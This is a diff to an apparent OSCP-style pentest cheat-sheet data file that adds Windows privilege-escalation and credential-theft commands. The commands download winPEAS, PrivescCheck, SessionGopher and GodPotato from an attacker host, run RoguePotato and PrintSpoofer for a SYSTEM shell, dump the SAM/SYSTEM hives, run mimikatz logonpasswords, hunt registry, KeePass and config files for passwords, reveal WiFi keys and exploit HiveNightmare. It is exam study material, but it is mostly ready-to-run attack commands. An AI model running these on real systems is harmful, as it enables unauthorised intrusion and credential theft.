@@ -5215,13 +5215,29 @@ Get-ChildItem -Path C:\\Users -Include local.txt,proof.txt -Recurse -EA Silently
 iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
 .\\wp.exe
 
-# Also run PowerUp
+# PowerUp — great for service vulns and unquoted paths
 iwr http://$LHOST/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
 . .\\pu.ps1
 Invoke-AllChecks
 
-# Seatbelt for targeted checks
-.\\Seatbelt.exe -group=all`,
+# Seatbelt — targeted host survey
+.\\Seatbelt.exe -group=all
+.\\Seatbelt.exe -group=system -outputfile C:\\Windows\\Temp\\seatbelt.txt
+
+# PrivescCheck — comprehensive, good output
+iwr http://$LHOST/PrivescCheck.ps1 -OutFile C:\\Windows\\Temp\\pc.ps1
+powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck"
+powershell -ep bypass -c ". .\\pc.ps1; Invoke-PrivescCheck -Extended"
+
+# WES-NG — feed systeminfo to find kernel exploits
+# On target:
+systeminfo > C:\\Windows\\Temp\\sysinfo.txt
+# Transfer sysinfo.txt to Kali then:
+# python3 wes.py sysinfo.txt
+# python3 wes.py --update && python3 wes.py sysinfo.txt
+
+# Watson / windows-exploit-suggester — alternative kernel exploit finder
+# ./windows-exploit-suggester.py --database mssb.xlsx --systeminfo sysinfo.txt`,
     warn: null,
     choices: [
       { label: "SeImpersonatePrivilege found", next: "token_privs" },
@@ -5245,6 +5261,10 @@ Invoke-AllChecks
 iwr http://$LHOST/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\ps.exe
 .\\ps.exe -i -c cmd
 .\\ps.exe -c "C:\\Windows\\Temp\\shell.exe"
+
+# RoguePotato — Win10 1809+ / Server 2019+
+# On Kali first: socat tcp-listen:135,reuseaddr,fork tcp:$LHOST:9999
+RoguePotato.exe -r $LHOST -e "cmd.exe" -l 9999
 
 # GodPotato — most universal (works on Server 2012-2022)
 iwr http://$LHOST/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
@@ -5339,22 +5359,25 @@ msiexec /quiet /qn /i C:\\Windows\\Temp\\shell.msi`,
   windows_creds: {
     phase: "WINDOWS",
     title: "Windows Credential Hunting",
-    body: "Check everywhere: registry, cmdkey, SAM/SYSTEM, browser creds, config files. secretsdump and mimikatz are manual tools — no MSF needed.",
-    cmd: `# Saved credentials
+    body: "Check everywhere. Module 17.1.3: always re-enumerate after gaining a new user — permissions change and you can read files you couldn't before. Password reuse is extremely common on OSCP boxes.",
+    cmd: `# ── SAVED CREDENTIALS ────────────────────────────────
 cmdkey /list
 runas /savecred /user:admin cmd
 
-# Registry password hunt
+# ── REGISTRY PASSWORD HUNT ───────────────────────────
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
+reg query "HKCU\\Software\\ORL\\WinVNC3\\Password"
 
-# SAM + SYSTEM dump (must be admin)
+# ── SAM + SYSTEM DUMP (must be admin) ────────────────
 reg save HKLM\\SAM C:\\Windows\\Temp\\sam
 reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
-# Transfer both, then on Kali:
+# Transfer both to Kali then:
 impacket-secretsdump -sam sam -system system LOCAL
 
-# Mimikatz (manual, no MSF)
+# ── MIMIKATZ ─────────────────────────────────────────
 .\\mimikatz.exe "privilege::debug" \\
   "token::elevate" \\
   "sekurlsa::logonpasswords" \\
@@ -5362,18 +5385,71 @@ impacket-secretsdump -sam sam -system system LOCAL
   "lsadump::cache" \\
   "exit"
 
-# Interesting file locations
-dir /s /b C:\\Users\\*.xml 2>$null
-dir /s /b C:\\Users\\*.txt 2>$null
-dir /s /b C:\\*pass* 2>$null
-dir /s /b C:\\*.config 2>$null`,
-    warn: null,
+# ── HIDDEN IN PLAIN VIEW (Module 17.1.3) ─────────────
+# Pattern: dave cant read file, steve can, steve finds admin creds
+# Always re-enumerate after gaining a new user
+
+# Search for KeePass databases
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -EA SilentlyContinue
+
+# Search XAMPP config files
+Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -EA SilentlyContinue
+type C:\\xampp\\passwords.txt
+type C:\\xampp\\mysql\\bin\\my.ini
+
+# Search user home dirs for documents
+Get-ChildItem -Path C:\\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -EA SilentlyContinue
+
+# Broad password file search
+Get-ChildItem -Path C:\ -Include *pass*,*cred*,*secret*,*.kdbx -File -Recurse -EA SilentlyContinue
+
+# cmd-style search
+dir /s /b C:\\Users\\*.xml
+dir /s /b C:\\Users\\*.txt
+dir /s /b C:\\*pass*
+
+# Runas with found password (requires GUI)
+runas /user:HOSTNAME\\targetuser cmd
+
+# ── SESSIONGOPHER ────────────────────────────────────
+# Extracts PuTTY/WinSCP/FileZilla/RDP saved sessions
+iwr http://$LHOST/SessionGopher.ps1 -OutFile C:\\Windows\\Temp\\sg.ps1
+Import-Module .\\sg.ps1
+Invoke-SessionGopher -Thorough
+
+# ── HIVENIGHTMARE CVE-2021-36934 ─────────────────────
+# SAM readable by normal users on unpatched Win10/11
+icacls C:\\Windows\\System32\\config\\SAM
+# If Users group has RX = vulnerable
+vssadmin list shadows
+# Copy from shadow copy and crack:
+impacket-secretsdump -sam sam -system system LOCAL
+
+# ── SHADOW COPIES ────────────────────────────────────
+vssadmin list shadows
+diskshadow list shadows all
+
+# ── WSL ──────────────────────────────────────────────
+wsl whoami
+# If WSL enabled: ubuntu.exe config --default-user root
+
+# ── WIFI PASSWORDS ───────────────────────────────────
+netsh wlan show profiles
+netsh wlan show profile <SSID> key=clear
+
+# ── INTERESTING FILE LOCATIONS ───────────────────────
+type C:\\Windows\\Panther\\Unattend.xml
+type C:\\Windows\\System32\\sysprep\\sysprep.xml
+type C:\\xampp\\phpMyAdmin\\config.inc.php
+Get-ChildItem -Path C:\\inetpub -Include web.config -Recurse -EA SilentlyContinue | Get-Content`,
+    warn: "Pattern: dave cant read a file, steve can, finds admin creds. ALWAYS re-enumerate after gaining access as a new user. Password reuse is extremely common on OSCP boxes.",
     choices: [
       { label: "Found NTLM hash — Pass the Hash", next: "pth" },
       { label: "Found plaintext creds", next: "creds_found" },
       { label: "Check DPAPI (browser/credential manager)", next: "dpapi" },
     ],
   },
+
 
   pth: {
     phase: "WINDOWS",
@@ -5516,7 +5592,7 @@ Find-ProcessDLLHijack
 # 6. PATH directories  <- often writable!
 
 # -- CHECK PATH FOR WRITABLE DIRS ---------
-$env:PATH -split ';' | % { icacls $_ 2>$null | findstr /i "everyone\|users\|modify\|write" }
+# PATH writable check: $env:PATH -split ';' | ForEach { icacls $_ }
 
 # -- CREATE MALICIOUS DLL -----------------
 msfvenom -p windows/x64/shell_reverse_tcp \
